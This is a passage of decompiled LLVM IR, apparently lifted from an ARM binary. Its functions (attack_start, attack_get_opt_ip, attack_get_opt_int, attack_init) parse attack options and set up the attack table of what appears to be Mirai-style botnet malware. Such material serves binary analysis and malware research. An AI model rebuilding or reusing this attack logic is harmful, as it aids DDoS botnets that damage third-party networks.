  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_14304.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_14304.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_23228.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2322c.31 to i32), i32* @r6, align 4
  store i32 36588, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_23229.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_2322c.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 36588, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 36588, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_23228.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_23229.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_23229.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_2322c.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
